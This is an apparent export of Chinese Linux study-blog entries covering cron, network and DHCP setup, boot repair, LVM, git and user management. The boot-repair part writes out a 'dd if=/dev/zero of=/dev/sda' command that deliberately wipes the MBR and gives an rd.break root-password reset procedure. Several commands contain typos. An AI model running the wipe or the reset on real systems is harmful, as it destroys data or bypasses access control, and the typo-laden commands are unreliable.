查看指定用户的常用命令组合答： 动态查看指定程序：top 程序名动态查看指定用户：top 用户名静态查看指定程序：ps 程序名静态查看指定用户：who 写出你知道的结束进程的相关命令、答; killPID 结束指定PID的进程Pkill进程名 结束指定进程名的进程Xkill 在图形化页面点杀进程 写出一次性计划任务和周期性计划任务的关键命令流程答：一次性计划任务; 在指定的日期、时间点自动的执行预先设置的一些命令操作，属于一次性计划任务系统服务的名称：/etc/init.d/atd设置格式：at [HH:MM] [yyyy-mm-dd]atq命令：查询当前设置的at任务列表 同 at -latrm命令：删除指定任务编号的at任务 atrm 编号 同 at -dat -c 任务号 查看计划任务的具体内容（和at计划任务文件/var/spool/at/以a开头的文件内容相同）at任务结束，文件消失 周期性计划任务; 按照预先设置的时间周期（分钟、小时、天…）重复执行用户执行的命令操作，这属于周期计划任务服务名称：/etc/init.d/crond主要设置文件：用户定义的设置，位于文件/etc/spool/cron/用户名cron服务配置文件：/etc/crontab(包含三部分：注释、环境变量、cron命令)注意：crond计划任务里的命令有时可能不被执行，因为cron的环境变量PATH 跟系统的PATH 不太一样，它的PATH 路径默认值为：PATH=/sbin:/bin:/usr/sbin:/usr/bin，所以这就造成很多命令不能使用，解决办法：1、自己设置cron的PATH环境变量 2、用命令的绝对路径，如ls我们可以使用： /bin/lscron服务日志文件：/var/log/cron管理cron计划任务：编辑计划任务：crontab -e [-u 用户名]查看计划任务：crontab -l [-u 用户名]删除计划任务：crontab -r [-u 用户名 ] 写出网卡配置文件的绝对路径以及文件中关键信息答：绝对路径：/etc/sysconfig/network-scripts/网卡号关键信息：ONBOOT=yesBOOTPROTO=staticIPADDR=静态ip地址NETMASK=255.255.255.0DNS=DNSIPGATEWAY=网关IP 写出临时配置ip 和永久生效的命令及流程 答： 临时配置ip：ifconfig eth0 192.168.1.33 netmask 255.255.255.0 up 永久配置ip：vim /etc/sysconfig/network-scripts/ifcfg-网卡号 修改添加以下内容： ONBOOT=yesBOOTPROTO=staticIPADDR=静态ip地址NETMASK=255.255.255.0DNS=DNSIP GATEWAY=网关IP 保存退出后，systemctl network restart 重启配置 配置网关和DNS的命令(两种)答：答：临时配置网关：route add default gw 网关ip永久配置网关：vim etc/sysconfig/network-scripts/ifcfg-网卡号 添加GATEWAY=网关ipDNS:vim etc/sysconfig/network-scripts/ifcfg-网卡号 添加DNS=DNSipvim etc/resolv.conf 添加nameserver DNSip（注意：当通过第一种方式添加DNS时，会同步到resolv.conf中） 写出配置DHCP服务的流程以及位置文件的相关信息答：1.安装dncp服务（安装方式不限）2.打开 vim/etc/dhcp/dhcp,conf3.cp /usr/share/doc/dhcp-4.2.5/dhcpd.conf.example /etc/dhcp/dhcpd.conf4.vim /etc/dhcp/dhcpd.conf 对其中内容进行编辑5.systectl start dhcpd 启动dhcp服务（注意：以上操作都是在关闭selinux和linux防火墙的情况下配置，且linux系统拥有静态IP） 分别写出如何解决mbr损坏 grub引导程序损坏 grub.cfg引导文件丢失 忘记密码 grub加密的方法以及流程答：MBR损坏：1.备份MBR:dd if=/dev/sda of=/root/mbr.txt count=1 bs=5122.损坏MBR:dd if=/dev/zero of=/dev/sda count=1 bs=2003.reboot4.用光盘修复：VMware设置从光盘启动5.进入启动界面：boot：linux rescue（输入）并回车6.进入系统：输入命令grub进入grub界面： grub&gt;root （hd1,0) #有可能是（hd0,0）或者其它 grub&gt;setup (hd1） grub&gt;quit7.sync;rebootgrub.cfg引导文件丢失：1.mv /boot/grub/grub.conf /root #将此文件移走2.reboot系统会直接进入grub界面3.grub&gt;find (hd0,0)/ 按Tab键，尝试找到系统所在分区grub&gt;root (hd0,0)grub&gt;kernel /vmlinuz- #按Tab键补全grub&gt;initrd /initrd- #按Tab键补全grub&gt;boot4.顺利进入系统并修复grub.conf 文件忘记密码：1、在启动页面按e进入内核编辑模式2、找到 Linux16 这一段，在末尾处添加 rd.break，按下组合键CTRL+X运行内核程序进入紧急救援模式3、在这个模式下依次输入以下命令mount -o remount,rw /sysrootchroot /sysrootpasswd # 注意：到这里的时候会提示输入两次需要重置的密码，输入完成之后回车即可touch /.autorelabelexitreboot4、重新进入系统输入刚刚重置的密码即可登陆root账户grub加密：1、查看内核版本 uname –r2、生成加密密码 grub-md5-crypt 还有密码3、在/boot/grub/grub.conf里面添加加密密码 vim /boot/grub/grub.conf 在title的上一行添加 passward –-4、重启服务器 reboot 分别写出压缩归档和解压缩归档的命令答：压缩归档:Tar zcvf 自定义压缩后的文件名.tar.gz 压缩的对象Tar jcvf 自定义压缩后的文件名.tar.bzip2 压缩的对象解压缩归档Tar zxfv 压缩文件.tar.gz -C 解压后存放的目录Tar jxvf 压缩文件.tar.b 2 -C 解压后存放的目录]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux搭建DHCP服务]]></title>
    <url>%2F2019%2F08%2F17%2FLinux%E6%90%AD%E5%BB%BADHCP%E6%9C%8D%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[1.首先配置网关静态IP：192.168.100.1 子网掩码：255.255.255.0 网关：192.168.100.254 DNS：114.114.114.114 启用网卡 ONBOOT=yes vi /etc/sysconfig/network-scripts/ifcfg-ens33 编辑网卡配置文件 TYPE=EthernetPROXY_METHOD=noneBROWSER_ONLY=noBOOTPROTO=staticIPADDR=192.168.100.1NETMASK=255.255.255.0GATEWAY=192.168.100.254DNS=114.114.114.114DEFROUTE=yesIPV4_FAILURE_FATAL=noIPV6INIT=yesIPV6_AUTOCONF=yesIPV6_DEFROUTE=yesIPV6_FAILURE_FATAL=noIPV6_ADDR_GEN_MODE=stable-privacyNAME=ens33UUID=45d0aa89-95c0-4f78-b14f-6e2cc287307bDEVICE=ens33 ONBOOT=yes 配置完成重新启动网卡服务 service network restart Restarting network (via systemctl): [ 确定 ] 启动成功 2.配置DHCPyum 安装DHCP 用命令yum repolist 查看下你自己电脑的yum源是否正常 yum clean all yum repolist yum list dhcp yum install dhcp.x86_64 安装成功 我们进到DHCP目录 cd /etc/dhcp 找到dhcpd.conf文件进行查看 cat dhcpd.conf 会出现一个DHCP目录 usr/share/doc/dhcp*/dhcpd.conf.example 我们要将这个目录复制到dhcpd.conf cp /usr/share/doc/dhcp*/dhcpd.conf.example /etc/dhcp/dhcpd.conf 覆盖成功以后 我们进入编辑 vim /etc/dhcp/dhcpd.conf 接下来我修改下，给自己改域名和自己的DNS网段 option definitions common to all supported networks… option domain-name “lanou.com”;option domain-name-servers 8.8.8.8; This declaration allows BOOTP clients to get dynamic addresses, which we don’t really recommend. subnet 192.168.100.0 netmask 255.255.255.0 { range dynamic-bootp 192.168.100.10 192.168.100.20; option broadcast-address 8.8.8.8; option routers 192.168.100.254;} 测试启动DHCP systemctl start dhcpd 然后进入WIN7客户端测试 将客户端IPV4 IP自动获取 ​ DNS自动获取 打开CMD 进入命令窗口 输入 ipconfig/renew 出现我们配置的IP 192.168.100.11 就成功了 IP绑定所谓IP绑定就是固定的把这个IP给一个机器，这个IP只给他其他的都不给 首先我先规定下一个IP比如说我只把192.168.100.11给客户端在拿到他们的MAC地址Win7：00:0C:29:B1:52:0A要做到的话我们要改下配置文件用命令打开DHCP配置文件，运行命令vim /etc/dhcp/dhcpd.conf Hosts which require special configuration options can be listed in host statements. If no address is specified, the address will be allocated dynamically (if possible), but the host-specific information will still come from the host declaration. host win7 {hardware ethernet 00:0c:29:0a:ad:a5;fixed-address 192.168.100.11option domain-name-servers 8.8.8.8 }]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux汇总]]></title>
    <url>%2F2019%2F08%2F15%2Flinux%E6%B1%87%E6%80%BB3%2F</url>
    <content type="text"><![CDATA[磁盘和文件系统管理一、磁盘管理及分区1． 检测并确认新磁盘​ fdisk -l 查看系统中硬盘设备及分区情况 A:部分展示的是sda 系统的第一个磁盘以及分区情况B部分展示的是sdb 系统的第二个磁盘及分区情况C部分展示的是lvm磁盘分区情况解析: :磁盘总容量为42949672960bytes 1k=1024b :磁盘总共划分的扇区数量 :磁盘划分的每个扇区大小为512b 磁盘相关概念:磁盘 片面和磁头硬盘中一般会有多个盘片组成，每个盘片包含两个面，每个盘面都对应地有一个读/写磁头。受到硬盘整体体积和生产成本的限制，盘片数量都受到限制，一般都在5片以内。盘片的编号自下向上从0开始，如最下边的盘片有0面和1面，再上一个盘片就编号为2面和3面。 磁盘的数据单位: 磁道(track)下图显示的是一个盘面，盘面中一圈圈灰色同心圆为一条条磁道，从圆心向外画直线，可以将磁道划分为若干个弧段，每个磁道上一个弧段被称之为一个扇区（图践绿色部分）。扇区是磁盘的最小组成单元，通常是512字节。（由于不断提高磁盘的大小，部分厂商设定每个扇区的大小是4096字节） 磁盘容量计算存储容量 ＝ 磁头数 × 磁道(柱面)数 × 每道扇区数 × 每扇区字节数图3中磁盘是一个 3个圆盘6个磁头，7个柱面（每个盘片7个磁道） 的磁盘，图3中每条磁道有12个扇区，所以此磁盘的容量为：存储容量 6 * 7 * 12 * 512 = 258048每个磁道的扇区数一样是说的老的硬盘，外圈的密度小，内圈的密度大，每圈可存储的数据量是一样的。新的硬盘数据的密度都一致，这样磁道的周长越长，扇区就越多，存储的数据量就越大。 柱面(cylinder)绕马达旋转轴旋转的多个磁盘，每个磁盘有两个盘面（片），每个盘面里有多个磁道（Track）。多个磁盘上相同大小的磁道在竖直空间上构成了一个柱面，类似于相同大小的一堆呼啦圈（磁道）从脚套到头，视觉上构成了一个空心筒（柱面）硬盘通常由重叠的一组盘片构成，每个盘面都被划分为数目相等的磁道，并从外缘的“0”开始编号，具有相同编号的磁道形成一个圆柱，称之为磁盘的柱面。磁盘的柱面数与一个盘面上的磁道数是相等的。由于每个盘面都有自己的磁头，因此，盘面数等于总的磁头数。 如下图 磁头磁头的质量影响整个磁盘的性能,只有精密的磁头才能在高转速和高密度磁盘工作的情况下高效正确的读写数据 扇区事实上仅把数据分为磁道，还不能达到细分数据区的目的（一个磁道中的数据容量还是相当大，即使是最内圈最小的磁道也是一样），因此我们再把磁道分为许多的扇区。由于内圈磁道的数据容量较少，因此内圈磁道所分割出来的扇区数码会比外圈磁道要少。扇区是磁盘上能读取数据的最小单位，大小为 512Bytes，也就是说 1 个 Byte 的文件，无论如何都要占据一个扇区的大小，无论这个扇区的数据量是 2KB 还是 16KB 都是一样。每个扇区内部的数据被视为连续的数据，因此实际存取时，需要再指定扇区中数据的地址，就可以找到所需要的数据 补充:硬盘在Linux中的表示Linux 的所有设备都被抽象为一个文件，保存在 /dev 目录下。根据接口可以分为：IDE、SATA、SAS、SCSI、USB。硬盘名称一般为：设备类型 + [a-z]，其中 [a-z] 表示第几块硬盘。IDE 硬盘的名称一般是：hd[a-z]。SATA 硬盘、SAS 硬盘、SCSI 硬盘和 USB 硬盘的名称一般为：sd[a-z]。例如，第一块 SATA 硬盘名为 /dev/sda，第二块 SATA 硬盘名为 /dev/sdb，以此类推… 分区把一块硬盘的磁盘逻辑地分为几个区，每个区当作独立磁盘，以方便使用管理。不同的分区用：“设备名 + 分区号”来表示，如第一块 SATA 硬盘的两个分区 sda1，sda2。主流的分区机制有 MBR 和 GPT。MBR（Master Boot Record，主引导记录）MBR 是传统的分区机制，应用于绝大多数使用 BIOS 引导的 PC 设备（苹果使用EFI的方式）MBR 支持 32 位和 64 位的操作系统 MBR 支持的分区数量有限 MBR 支持不超过 2T 的硬盘，超过 2T 的硬盘只能使用 2T 空间（有第三方解决办法），因为MBR的寻址空间只有 32 位长 MBR 结构：占用硬盘最开头的 512 字节，即 0 柱面 0 磁道 1 扇区。前 446 字节是引导代码，不同操作系统的引导代码不一样。然后是 4 个 16 字节的主分区表信息。最后 2 个字节 55 AA，是操作系统的启动标识。 MBR 分区：主分区：最多只能创建 4 个主分区。扩展分区：一个扩展分区占用一个主分区位置。逻辑分区：逻辑分区是基于扩展分区创建出来的。Linux 最多支持 63 个 IDE 分区和 15 个 SCSI 分区。GPT（GUID Partition Table，全局唯一标识分区表）GPT 是一个较新的分区机制，解决了 MBR 的很多缺点。GPT 支持超过 2T 的硬盘 GPT 向后兼容 MBR GPT 分区必须使用 64 位的系统 Mac、Linux 系统都支持 GPT 分区 Windows7 64位、WindowsServer2008 64位支持 GPT 分区 Device Boot Start End Blocks ID system分区设备文件名称 是否是引导分区*代表是引导分区 该分区在硬盘中开始柱面位置 该分区在硬盘中结束柱面位置 块,最小的存储单位,默认每个块大小为1024字节这里指该分区总共划分了多少个块 分区对应的文件系统ID83:XFS系统8E:表示lvm逻辑卷82:表示swap86:表示ntfs 分区类型 磁盘块/簇（虚拟出来的）。 块是操作系统中最小的逻辑存储单位。操作系统与磁盘打交道的最小单位是磁盘块。通俗的来讲，在Windows下如NTFS等文件系统中叫做簇；在Linux下如Ext4等文件系统中叫做块（block）。每个簇或者块可以包括2、4、8、16、32、64…2的n次方个扇区。 为什么存在磁盘块？读取方便：由于扇区的数量比较小，数目众多在寻址时比较困难，所以操作系统就将相邻的扇区组合在一起，形成一个块，再对块进行整体的操作。分离对底层的依赖：操作系统忽略对底层物理存储结构的设计。通过虚拟出来磁盘块的概念，在系统中认为块是最小的单位。 扇区： 硬盘的最小读写单元 块/簇： 是操作系统针对硬盘读写的最小单元 2．规划磁盘中的分区Fdisk /dev/sda ————-对指定硬盘分区进入”交互式分区管理”界面:交互操作指令如下:P:列出磁盘中的分区情况 n:新建分区分区包括:主分区\扩展分区\逻辑分区(主分区+扩展分区&lt;=4个)选择分区类型:——p:主分区 —–e:扩展分区 ——l:创建逻辑分区 (注意:只有在有扩展分区的情况下,才会出现l选项,创建逻辑分区) d:删除分区 w和q ———fdisk分区工具W:保存写入q:退出分区工具当磁盘的分区发生变化后,最好是重启或是执行partprobe /dev/sdbPartprobe:使操作系统重新检测分区变化,如果不执行,可能会出现格式化时损坏数据,严重导致系统崩溃. 管理文件系统一 创建文件系统 mkfsmkfs是一个前端工具,自动加载不同的程序来创建的各种不同的文件系统.mkfs后端包括很多的相关命令,命令程序位于/sbin/目录中ls /sbin/mkfs.* mkfs命令的使用格式:mkfs -t 文件系统类型 分区设备系统文件对比: 文件系统类型 优点 缺点Ext3:第三代扩展文件系统Ext4:第四代扩展文件系统1EB=1024PB1PB=1024TB Ext3(linux 5默认系统文件) 带有fsck 效率低 慢支持32000个目录 Ext4(linux6默认系统文件) 相对3 带有fsck 效率高 快对目录的支持无限制最大支持文件系统容量为1EB,文件容量为16TBXfs:高性能日志文件系统 Xfs(linux7默认系统文件) 最大支持8EB文件系统容量 (1) 创建xfs文件系统mkfs -t xfs /dev/sdb1 ———将sdb1分区格式化为xfs文件系统或mkfs.xfs /dev/sdb1 (2) 创建Ext4文件系统Msfs -t ext4 /dev/sdb2或mkfs.ext4 /dev/sdb2 (3) 创建fat32文件系统mkfs -t vfat -F 32 /dev/sdb7或mkfs.vfat -F 32 /dev/sdb7 mkswap将/dev/sdb8创建swap文件系统(1) mkswap /dev/sdb8 —–创建swap交换分区(2) Swapon /dev/sdb8 —–启用swap分区Swapoff /dev/sdb8 ——关闭swap分区注释:swap分区大小应该是物理内存的1.5-2倍 现在内存足够可以不使用交换分区 二 挂在卸载文件系统临时挂载 挂在文件系统 (1) mount (-t 文件系统) 设备名称挂载mount命令的使用格式,文件系统可省 例如: mount /dev/sr0 /media ——–将光驱挂载到/media (sr0 和 cdrom都代表光驱) =mount /dev/cdrom /media ###### (2) 挂载.iso文件,可以直接查看.iso压缩文件的内容 **mount -o loop /dev/CentOS-7.5-x86_64-DVD-1804.iso /media** **-o loop:iso**文件视为一种特属的回环文件系统 卸载文件系统 Umount 挂载点或是设备名称 ——-卸载挂载点的命令格式例如:umount /dev/sr0 ————-卸载掉光盘的挂载点=umount /dev/media =umount /dev/sr0 /media Mount 查看挂载情况 永久挂载 ——-通过修改mount配置文件的方式永久挂载 设置文件系统的自动挂在 /etc/fstab ———-(mount的配置文件)永久挂载的配置文件 Vim /etc/fstab文件格式 /dev/sdb1 /media Xfs Defaults 0 0设备名 挂载点 文件系统类型(如:xfs swap) 挂载参数 (是否在-o) 文件系统是否dump备份 1表示需要 0表示不需要 系统启动时检查磁盘的顺序0:不检查1:检查(根分区) 2:其次检查(其他分区) 查看磁盘的使用情况df -Th ——查看磁盘的使用情况-T:显示文件系统类型-h:以友好的显示单位来显示 LVM逻辑卷和磁盘配额LVM逻辑卷一、LVM概述1．LVM是linux操作系统下一种逻辑管理磁盘分区的机制,可以在保持现有数据不变的情况下动态调整磁盘的容量.2．LVM的基本术语 （1）PV(physical volume物理卷)① 物理卷是LVM的基本存储设备.② 创建物理卷时会在分区或是磁盘的头部创建一个保留区块,用于记录LVM的属性, 并把存储空间逻辑分割成默认4MB大小的基本单元(PE)从而构成物理卷③ 将普通分区/dev/sdb1转成物理卷是需要先将分区类型ID改为8e （2）VG(volume group 卷组)①卷组是一个或多个物理卷的集合②在卷组内可以动态添加或是删除物理卷③卷组的名字可以自定义 （3）LV(logical volume 逻辑卷)①逻辑卷是在卷组上逻辑划分的卷,与物理卷没有关系②将逻辑卷的空间安装文件系统,挂载到挂载点就可以使用,相当于普通分区③普通分区和逻辑分区的创建使用过程对比: 二、LVM管理命令命令总结:功能 物理卷管理 卷组管理 逻辑卷管理Scan 扫描 pvscan vgscan lvscanCreate 建立 pvcreate vgcreate lvcreateDisplay 显示 pvdisplay vgdisplay lvdisplayRemove 删除 pvremove vgremove lvremoveExtend 扩展 vgextend lvextendReduce 减少 vgreduce lvreduce (1) 物理卷管理① pvsan ——-扫面所有的物理卷 功能 物理卷管理 卷组管理 逻辑卷管理Scan 扫描 pvscan vgscan lvscanCreate 建立 pvcreate vgcreate lvcreateDisplay 显示 pvdisplay vgdisplay lvdisplayRemove 删除 pvremove vgremove lvremoveExtend 扩展 vgextend lvextendReduce 减少 vgreduce lvreduce (1) 物理卷管理① pvsan ——-扫面所有的物理卷解析:/dev/sda2普通分区已经转为PV 属于centos 这个VG组 总空间是39G 总共1个PV 有1个PV正在使用 有0个PV不属于VG组 ② pvcreate —–将分区或是整个硬盘转为物理卷Pvcreate /dev/sdb1 sdb2 sdb5 ——-将这三个分区转为PV,为创建VG做准备 解析:提示已经成功将这三个普通分区转为PV物理卷 ③ pvdisplay —–显示物理卷的详细信息pvdisplay 解析:三个分区已经转为PV,待用PV空间pvsize为分区的物理空间 ④ pvremove —–将物理卷还原为普通分区Pvremove /dev/sdb5 ——将/dev/sdb5转为普通分区 (2) 卷组管理① vgscan —-扫描系统中已经建立的lvm卷组② vgcreate —-将一个或是多个已存在的物理卷创建为一个卷组 解析:1.先扫描有哪些PV pvscan命令2.创建VG组名为:new_vgzu 并把sdb1,2,5三个PV加入到VG组内(VG组的空间=三个PV的总空间) 3.Vgcreat -s 16M vgzu /dev/sdb{1,2,5} —-创建vgzu(vg组的组名)并将sdb1 sdb2 sdb5三个pv加入VG组 并指定大小为16MB} ③ vgdisplay —–查看系统中卷组的详细信息④ Vgremove —-删除指定卷组Vgremove new_vgzu ——-删除名为new_vgzu这个VG组 ⑤ Vgextend —–扩展卷组的磁盘空间–扩展卷组的空间的方式就是往里添加PVVgextend 组名 PV设备名 6 vgreduce —–删除vg组中的指定PVVgreduce 组名 PV设备名例如: vgextend new_vgzu /dev/sdb6 ——将/sdb6这个PV扩展到已存在的VG组new_vgzu (3) 逻辑卷管理 VG组是把多个PV空间汇总到VG组,然后将VG组划分成LV,才可以创建文件系统,挂载使用.从VG组分割LV: ① Lvscan ———扫描已存在的LV逻辑卷② Lvcreate ——从VG组创建LV1) 格式:lvcreate -L 空间 -n 名称 VG组名例如:lvcreate -L 10G -n games new_vgzu —–从new_vgzu中创建一个10G空间的名叫games的LV逻辑卷(也就是分区) ③ Lvdisplay——显示逻辑卷的详细信息Lvdisplay ④ Lvextend—–用于在不损坏数据的情况,动态扩展逻辑卷的空间.lvextend -L +空间 /dev/vg组/逻辑卷例如:lvextend -L +1G /dev/new_vgzu/games –给games从VG组内增加1G空间例如:lvresize -L -1G -f /dev/new_vgzu/games —–减掉games1G 的空间 =lvreduce -L -1G -f /dev/new_vgzu/games ⑤ LvremoveLVremove /dev/new_vgzu/games —–删除games这个LV 三、LVM 的应用公司准备在Internet中搭建FTP服务器（CentOS 7.3平台），面向全国各地的员工及部分VIP客户提供资料上传下载的空间。考虑动态扩容的需要，计划增加两块40G的SCSI硬盘并构建LVM逻辑卷（用xfs文件系统挂载到/date目录下）专门用于存放邮件数据(1) 关闭服务器,增加两块硬盘(2) 开启服务器,执行fdisk -l查看是否识别到新加的两块磁盘(sdb sdc)(3) 创建普通分区 /dev/sdb1 /dev/sdc1,(fdisk )并查看是否已经创建成功.(fdisk -l /dev/sdb /dev/sdc)(4) 将普通分区转换为PV(pvcreate 分区名)(5) 将两个物理卷整合为VG组名为ftp_vg (vgcreat 组名 pv)(6) 在ftp_vg组创建为ftp的LV (lvcreate -L 空间 -n lv名称 vg组名)(7) 将ftp逻辑卷格式化(mkfs.xfs lv全名)(8) 创建/date目录(9) 将ftp逻辑卷(lv)挂载到/date (vim fstab或是mount)(10) 查看结果 df -Th]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git常用命令]]></title>
    <url>%2F2019%2F08%2F14%2Fgit%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[1.远程仓库相关命令检出仓库：$ git clone git://github.com/jquery/jquery.git 查看远程仓库：$ git remote -v 添加远程仓库：$ git remote add [name] [url] 删除远程仓库：$ git remote rm [name] 修改远程仓库：$ git remote set-url –push[name][newUrl] 拉取远程仓库：$ git pull [remoteName] [localBranchName] 推送远程仓库：$ git push [remoteName] [localBranchName] 2.分支(branch操作相关命令查看本地分支：$ git branch 查看远程分支：$ git branch -r 创建本地分支：$ git branch [name] —-注意新分支创建后不会自动切换为当前分支 切换分支：$ git checkout [name] 创建新分支并立即切换到新分支：$ git checkout -b [name] 删除分支：$ git branch -d [name] —- -d选项只能删除已经参与了合并的分支，对于未有合并的分支是无法删除的。如果想强制删除一个分支，可以使用-D选项 合并分支：$ git merge [name] —-将名称为[name]的分支与当前分支合并 创建远程分支(本地分支push到远程)：$ git push origin [name] 删除远程分支：$ git push origin :heads/[name] 我从master分支创建了一个issue5560分支，做了一些修改后，使用git push origin master提交，但是显示的结果却是’Everything up-to-date’，发生问题的原因是git push origin master 在没有track远程分支的本地分支中默认提交的master分支，因为master分支默认指向了origin master 分支，这里要使用git push origin issue5560：master 就可以把issue5560推送到远程的master分支了。 如果想把本地的某个分支test提交到远程仓库，并作为远程仓库的master分支，或者作为另外一个名叫test的分支，那么可以这么做。 $ git push origin test:master // 提交本地test分支作为远程的master分支 //好像只写这一句，远程的github就会自动创建一个test分支 $ git push origin test:test // 提交本地test分支作为远程的test分支 如果想删除远程的分支呢？类似于上面，如果:左边的分支为空，那么将删除:右边的远程的分支。 $ git push origin :test // 刚提交到远程的test将被删除，但是本地还会保存的，不用担心 3.版本(tag)操作相关命令查看版本：$ git tag 创建版本：$ git tag [name] 删除版本：$ git tag -d [name] 查看远程版本：$ git tag -r 创建远程版本(本地版本push到远程)：$ git push origin [name] 删除远程版本：$ git push origin :refs/tags/[name] 4.子模块(submodule)相关操作命令添加子模块：$ git submodule add [url] [path] 如：$ git submodule add git://github.com/soberh/ui-libs.git src/main/webapp/ui-libs 初始化子模块：$ git submodule init —-只在首次检出仓库时运行一次就行 更新子模块：$ git submodule update —-每次更新或切换分支后都需要运行一下 删除子模块：（分4步走哦） 1)$ git rm –cached [path] 2) 编辑“.gitmodules”文件，将子模块的相关配置节点删除掉 3) 编辑“.git/config”文件，将子模块的相关配置节点删除掉 4) 手动删除子模块残留的目录 5)略一些文件、文件夹不提交 在仓库根目录下创建名称为“.gitignore”的文件，写入不需要的文件夹名或文件，每个元素占一行即可，如 target bin *.db git操作删除文件git删除文件 rm add2.txt git rm add2.txt git commit -m “rm test” git push web ———–at server cd /var/www/foo.git;sudo git update-server-info ————检查删除效果 cd;rm foo3 -rf;git clone http://[某ip]/foo.git foo3 ————更新已经存在的local code cd;cd foo2 git remote add web [某user]@[某ip]:/var/www/foo.git/ git pull web master gitreset –soft origin/master目标是更新本地分支和远程master分支同步（但是不会丢失本地更改），然后重新git add. git commit .git push. git stash #可用来暂存当前正在进行的工作 git stash pop #从Git栈中读取最近一次保存的内容 git stash list #显示Git栈内的所有备份 git stash clear #清空Git栈 git stash apply stash@{1} #可以将你指定版本号为stash@{1}的工作取出来]]></content>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux汇总]]></title>
    <url>%2F2019%2F08%2F14%2Flinux%E6%B1%87%E6%80%BB2%2F</url>
    <content type="text"><![CDATA[用户管理和文件权限1.用户管理:(1)超级用户:拥有操作系统的最高权限,可以进行任何操作.默认是root.它的Uid,gid都是0 (2)普通用户:是有管理员创建的用户,权限有限,只对自己的家目录拥有完整权限 Centos 7的Uid是从1000开始. (3)虚拟用户:(程序用户===&gt;植物人),一般用来运行服务时候指定的用户,不能登录操作系统. 系统的默认用户: Centos6之前是1—499; Centos7开始是1—999; 2.用户和组管理的重要文件(1)用户管理配置文件:/etc/passwd haha :x:1000:1000:haha:/home/haha:/bin/bash dhcpd :x:177:177:DHCP server:/:/sbin/nologin 第一列:用户名; 第二列:密码占位符 第三列:uid(user id用户唯一标识) 第四列:gid (group id) 第五列:全名 第六列:用户家目录 第七列:是否允许登录操作系统./bin/bash允许登录系统;/sbin/nologin不允许登录系统. (2)用户的密码文件:/etc/shadowhaha:$6$gBMaK.xDoFH6LksE$DHtW/IrzjAIS.fyoSg.jaiQId.lviYrHH8aU5mGiOJur7ksEQgCQxD1CKI8gsZakw6sDwmzVk1oWnzF9NYoAh.:18116:0:99999:7::: 第一列:用户名 第二列:用户加密后的密码,用SHA加密 第三列:密码的修改时间,距离1970-01-01的时间 第四列:密码的最短有效期,如果为0,表示无限制 第五列;密码的最长有效期 第六列:提前7天提醒 第七列:账号的失效时间 第八列:未定义 (3)组相关:/etc/group jishubu:x:2000: 第一列:组名 第二列:组密码占位符 第三列:gid(组ID) 第四列:组成员 3.用户管理的命令:useradd/usermod (1)命令的基本格式: useradd [参数-G/-g/-d/-s/-u] [参数的值] 操作的用户username 举例: useradd xiaoming //创建一个用户,默认会创建一个同名的组,这个用户就属于同名组. id xiaoming //检查用户的uid/gid和基本组信息 usermod -G heihei xiaoming //-G是给一个用户指定一个”附加组”; id xiaoming uid=1002(xiaoming) gid=1002(xiaoming) 组=1002(xiaoming),1001(heihei) //xiaoming是基本组,heihei是附加组 useradd xiaohua id xiaohua usermod -g heihei xiaohua //-g是指定用户的基本组,把xiaohua的基本组设置为heihei useradd -d /admin -g jishubu -G root admin //创建一个用户admin,-d指定家目录,-g指定基本组;-G指定附加组 groupadd -g 2001 caiwubu //创建一个组叫caiwubu,同时指定gidWie2001 useradd -u 2001 -g 2001 -d /testbbb bbb //创建一个用户bbb,同时指定uid=gid=2001,指定(同时会创建)家目录为/testbbb; 默认普通用户的家目录在/home/用户名 useradd -s /sbin/nologin -M www //创建一个虚拟用户(植物人),用户名叫www,-M是不指定家目录; -s 指定用户登录的shell./sbin/nologin表示不允许登录系统.(2)passwd给用户设置密码​ passwd xiaoming //给小明设置密码​ Passwd -d aa ——-清空aa用户的密码​ passwd -l xiaoming //锁定xiaoming​ passwd -u xiaoming //给xiaoming解锁​ passwd -S xiaoming //查看小明的状态​ (3)批量创建用户举例: for n in {1..20};do useradd user$n;done //基本格式:for ;do 执行的命令;done (4)删除用户和家目录 userdel aaa //删除用户,家目录还在 userdel -r aaa //删除用户的同时,删除家目录 (5)组管理的命令: groupadd xiaoshoubu //创建一个组,叫xiaoshoubu groupadd -g 2001 caiwubu //创建一个组叫caiwubu,同时指定gidWie2001 groups xiaoming //查看xiaoming这个用户,属于的组 gpasswd -d szy szy //把szy这个用户,从szy这个组里-d移除 groupdel szy //删除szy这个组 说明:如果有某个用户把这个组作为基本组,那么这个组就无法删除.—–&gt;要么直接把用户删除;要么直接把用户走. 课堂练习:1.创建组叫 jishubu caiwubu2.创建用户aaa,指定用户的uid=gid=2000;3.创建用户xiaoming,xiaohua4.把xiaoming加入附加组到jishubu;把xiaohua加入到附加组caiwubu;5.批量创建20个用户叫user1,user2,user3…..命名;并查看/etc/passwd检查结果;6.删除20个用户和他们的家目录7.创建shichangbu的组8.创建用户aaa,bbb,ccc;把多个用户都加入到shichangbu这个组中.9.创建用户ddd,把ddd加入到shichangbu这个附加组里;10.创建user这个组,再删除.给出命令 修改为英文字符集:[root@cent7 /]# cat /etc/locale.conf //编辑”字符集”配置文件 #LANG=”zh_CN.UTF-8”LANG=”en_US.UTF-8”[root@cent7 /]# source /etc/locale.conf //重新加载配置文件[root@cent7 /]# echo $LANG //查看字符集的环境变量en_US.UTF-8 今日单词:username 用户名Password 密码locked 锁定remove 移除directory 目录cd=change directory //切换目录 cd /etcgroupadd -g 1010 actortail -1 group actor:x:2000:useradd -u 2000 -s /sbin/nologin -g 1010 danieltail -1 passwddaniel:x:1024:1010::/home/aaa 添加一个用户后,useradd命令会在该用户的宿主目录中建立一些初始配置文件,这些文件都是隐藏的.文件包括三个: 1. .bash_logout —-文件中的命令将会在每次退出登录时执行 2. .bash_profile —–文件中的命令将会在用户每次登录时被执行 3. .bash_bashrc —–文件中的命令将会在每次加载bash时候执行 alias kaobei=&apos;cp -i&apos; kaobei user1.txt user2.txt /etc目录下也有bashrc这个文件,这里面的文件是面对所有用户(全局配置) Part2:文件属性1.查看文件属性;[root@cent7 test]# ls -lhi //-l是以长格式显示;-h是以人们易读的方式显示;-i是inode节点号.操作系统为了读取效率更高,会给每个文件创建一个inode节点号.total 